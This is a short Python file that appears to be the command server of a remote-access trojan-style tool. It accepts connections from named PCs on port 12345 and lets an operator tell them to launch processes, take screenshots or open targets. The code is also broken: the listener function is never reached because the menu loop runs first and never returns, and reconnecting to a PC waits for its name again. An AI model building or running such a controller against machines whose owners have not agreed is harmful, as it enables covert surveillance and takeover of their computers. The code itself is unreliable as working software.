import socket
import threading

clients = {}

def handle_client(client_socket, client_address):
    client_name = client_socket.recv(1024).decode('utf-8')
    clients[client_name] = client_socket
    print(f"[+] {client_name} connected from {client_address}")

    while True:
        command = input(f"{client_name}@server> ")
        
        if command == 'exit':
            client_socket.close()
            del clients[client_name]
            break
        elif command.startswith('open_process'):
            process_name = input("Enter process name: ")
            client_socket.send('open_process'.encode('utf-8'))
            client_socket.send(process_name.encode('utf-8'))
        elif command == 'screenshot':
            client_socket.send('screenshot'.encode('utf-8'))
        elif command.startswith('open '):
            client_socket.send(command.encode('utf-8'))

def server_menu():
    print("Available commands:")
    print("1. pclist - List connected PCs")
    print("2. pcon PCNAME - Connect to a specific PC")
    print("3. exit - Exit")

def server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 12345))
    server_socket.listen(5)
    print("[+] Listening for incoming connections")

    while True:
        client_socket, client_address = server_socket.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_thread.start()

def main():
    while True:
        server_menu()
        command = input("> ")

        if command == 'pclist':
            print("Connected PCs:")
            for pc in clients:
                print(f"- {pc}")
        elif command.startswith('pcon '):
            pc_name = command.split(' ')[1]
            if pc_name in clients:
                handle_client(clients[pc_name], clients[pc_name].getpeername())
            else:
                print(f"No PC named {pc_name} connected")
        elif command == 'exit':
            break

if __name__ == "__main__":
    main()
    server()
